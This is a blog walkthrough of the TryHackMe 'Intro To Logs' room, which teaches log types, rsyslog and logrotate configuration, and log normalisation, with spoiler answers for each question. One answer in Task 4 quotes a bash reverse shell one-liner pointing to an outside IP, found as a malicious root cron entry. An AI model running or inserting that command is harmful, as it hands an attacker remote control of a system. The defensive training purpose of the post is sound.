---
layout: post
title:  "TryHackMe - Intro To Logs"
date:   2023-11-11 00:00:00 +0900
categories: [Logging]
comments: true
---

##### Learn the fundamentals of logging, data sources, collection methods and principles to step into the log analysis world

---

<div> <img src="/images/logs.jpeg" alt="Computer tech cartoon" /> </div>

---

### Introduction

This is a guide to [tryhackme: Intro To Logs](https://tryhackme.com/room/introtologs). The room starts with some nice graphics and a brief outline of learning outcomes. It looks like there is a lot to do, so let's get stuck in!  

---

### Task 2 - Perspectives: Logs as Evidence of Historical Activity

I'm not going to give the same information as the room does as I think the copyright rightly belongs to THM.

Start the machine here and it should open in the split-screen view. If it doesn't find the blue button at the top right of the page and click to open in split screen view. I'm doing this on a 13" notebook so split screen is a bit too tiny. When I want to interact with the machine in browser or RDP I tend to maximise the browser window and separate it and then stick it on the next desktop and use ctrl+Windows+arrow(R/L) to switch between remote machine and local.

For this machine you actually don't really need a desktop so I just ssh in from my WSL linux install through the VPN. I will document my usual setup here soon. 

However you choose to connect the login credentials for damianhall are on this page.

---

**Q1:  What is the name of your colleague who left a note on the Desktop?**

*Check the note.*

```bash
cat Desktop/note.txt # (or open in the GUI) 
```

<details>
  <summary>Spoiler warning: Answer</summary>
  Perry
</details>

---

**Q2: What is  full path to the suggested log file for initial investigation?**

*Check the note!*

<details>
  <summary>Spoiler warning: Answer</summary>
  /var/log/gitlab/nginx/access.log
</details>

---

### Task 3 - Types, Formats, and Standards

There's a lot of good information here about log types and how they are structured. It's not easy to memorize this stuff without some practical applications. But I try to consider why each data point is necessary within each log and the structure becomes more intuitive. I haven't memorized it, but I'm confident that when I come across these types of logs in the wild then I will have a good chance at understanding them.

**Q1: Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?**

*Task 2 was discussing an Nginx server which is a web server...*

<details>
  <summary>Spoiler warning: Answer</summary>
  Web Server Log
</details>

---

**Q2: Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?**

*The materials clearly list what format the Nginx web server uses by default.*

<details>
  <summary>Spoiler warning: Answer</summary>
  combined
</details>

---

### Task 4 - Collection, Management, and Centralisation

A lot of information here and an important note about time synchronisation to ensure the timeline of the logs. This is not possible on the room's VM because it doesn't have an internet connection (and you don't have root access either unless you've found a way in).

Go through the exercises and configure rsyslog.

---

**Q1: After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?**

*after you have done the exercises you should be able to view the log file - so run:*

```bash
cat /var/log/websrv-02/rsyslog_sshd.log 
```

*Look for the 'Disconnected from invalid user...'*

<details>
  <summary>Spoiler warning: Answer</summary>
  stansimon
</details>

---

**Q2: What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?**

*Check the cron configuration.*

```bash
 cat /etc/rsyslog.d/99-websrv-02-cron.conf
```

<details>
  <summary>Spoiler warning: Answer</summary>
  10.10.10.101
</details>

---

**Q3: Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?**

*Look in the cron log grep for root and CMD.*

```bash
cat /var/log/websrv-02/rsyslog_cron.log | grep -E 'root|CMD'
```

<details>
  <summary>Spoiler warning: Answer</summary>
  /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
</details>

---

### Task 5 - Storage, Retention and Deletion

Read the info - main points are to have a storage, retention deletion and backup policy in place and to stick to it for many reasons including regulatory and legal but also to allow automation and reduce human error.

Follow the practical activity to automate log rotation.

---

**Q1: Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?**

*Look in the cron configuration.*

```bash
cat /etc/logrotate.d/99-websrv-02_cron.conf
```

<details>
  <summary>Spoiler warning: Answer</summary>
  24
</details>

---

**Q2: Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?**

*See the output for the last question.*

<details>
  <summary>Spoiler warning: Answer</summary>
  hourly
</details>

---

### Task 6 - Hands-on Exercise: Log analysis process, tools, and techniques

Time to get our hands dirty. There's still quite a bit of new information on data sources, parsing, normalising and sorting log data along with classification, enrichment, correlation, visualisation and finally reporting.

The room then goes on to discuss log analysis techniques.  

The introduction to the practical exercise mentions some methods to parse logs from the command line. While I'm quite comfortable with cat, grep, sort and uniq. I haven't often used awk or sed and these look like super powerful tools that I have noted for further study.

To view the logs they introduce an open source log viewer that is available for download from github. This is already installed on the room's VM so you won't need to download it.

Follow the long, cumbersome url given in the grey box (not the link to the github page) to look at the raw logs in a browser either in the GUI through the browser, from an AttackBox instance, or your own machine connected through the VPN. I have WSL Linux connected to the vpn and have a Google Chrome instance running from the WSL to connect.

Each step is given to process each log file using the command line. First the nginx, then rsyslog_cron, then rsyslog_sshd and finally gitlab-rails/api_json. Logs are normalised using awk and sed - that is the time and date formats are made to match each other and columns are rearranged to allow consolidation. Finally the commands output to a consolidated log file.

The normalisation commands are a bit long and, in my opinion, messy. These should probably be written into a script and automated, but they get the job done just running them from the command line.

Then sort and uniq are used to, well...sort and remove duplicates from the log entries.

Again follow the url (not the link) in your browser (connected to the THM network) to view the consolidated log files. Open in a new tab because you'll want to access the unparsed data too.

---

**Q1: Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?**

*OK, this is the unparsed log file that we opened initially NOT the normalised and consolidated one. Hopefully you have it open. Follow the hint and click the dropdown next to the add filter.*

<details>
  <summary>Spoiler warning: Answer</summary>
  No date field
</details>

---

**Q2: What is the process of standardising parsed data into a more easily readable and query-able format?**

*This is what we did to the log file with all those awk sed and sort and uniq commands...*

<details>
  <summary>Spoiler warning: Answer</summary>
  normalisation
</details>

---

**Q3: What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?**

*This one isn't initially obvious unless you've really understood the reading at the start of this chapter. When we consolidate multiple logs we are really adding value to our log files. When we add extra context to a log in the form of say, an IP address we are performing xxxxxxxxxx on the log.*

<details>
  <summary>Spoiler warning: Answer</summary>
  enrichment
</details>

---

### Conclusion

I learned *a lot* from this room. And it has already started me off exploring the powerful awk and sed programs. 

Next: [Log Operations](https://tomnowell.github.io/THM-Log-Operations/)
